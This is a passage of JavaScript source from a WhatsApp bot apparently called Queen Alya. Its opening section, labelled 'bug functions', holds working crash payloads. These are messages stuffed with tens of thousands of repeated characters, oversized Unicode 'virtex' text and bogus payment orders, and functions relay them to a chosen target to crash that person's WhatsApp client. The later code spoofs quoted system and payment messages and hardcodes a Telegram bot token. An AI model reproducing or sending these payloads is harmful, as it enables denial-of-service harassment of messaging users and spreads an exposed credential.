participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝐐𝐮𝐞𝐞𝐧𖤛𝐀𝐥𝐲𝐚`
}
}
}
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": balya
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Rias Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐀𝐥𝐲𝐚 𝐗 𝐂𝐫𝐚𝐬𝐡`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
const Alyabug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./src/data/function/ABug/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Pᴀɪɴᴢʏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

const zpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./src/data/function/ABug/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍ CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`

}

]

}

}

}

}


async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `𝐀𝐥𝐲𝐚 𝐂𝐫𝐚𝐬𝐡.doc`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function iponcrash(target) {
await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 
//=============={End of bug functions}============\\

        //premium
        async function replyprem(teks) {
    replygcalya(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendAlyaBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await AlyaBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygcalya(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                AlyaBotInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./AlyaMedia/theme/alya.jpg'),
                            sourceUrl: king
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               AlyaBotInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./AlyaMedia/theme/alya.jpg'),
                        sourceUrl: king,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 'v4') {
                replygcalya2(teks)
            }
        }
        
        //fake reply with channel link embedded
async function replygcalya2(txt) {
const alyanewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "QUEEN ALYA",
newsletterJid: "https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
sourceUrl: king
},
},
text: txt,
}
return AlyaBotInc.sendMessage(from, alyanewrep, {
quoted: m,
})
}
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=2348100835767:2348100835767\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./AlyaMedia/theme/alya.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = AlyaBotInc.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: AlyaBotInc.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = true
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = true
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: true,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = true
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: AlyaBotInc.getName(botNumber), alias: botname}, owner: { nick: AlyaBotInc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: AlyaBotInc.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: AlyaBotInc.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//autoreact
const alyareact = async () => {
  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    AlyaBotInc.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  AlyaBotInc.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}

//bug loading
async function loading () {
var alyaload = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》20%",
"《 ████▒▒▒▒▒▒▒▒》40%",
"《 ███████▒▒▒▒▒》60%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 👑..."
]
let { key } = await AlyaBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < alyaload.length; i++) {
await AlyaBotInc.sendMessage(from, {text: alyaload[i], edit: key })
}
} 


async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//sticker meta function
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcalya('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const alyaresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'QueenAlya',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            alyaresult.push(result)
        }
    resolve(alyaresult)
    })
}
//mega download
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

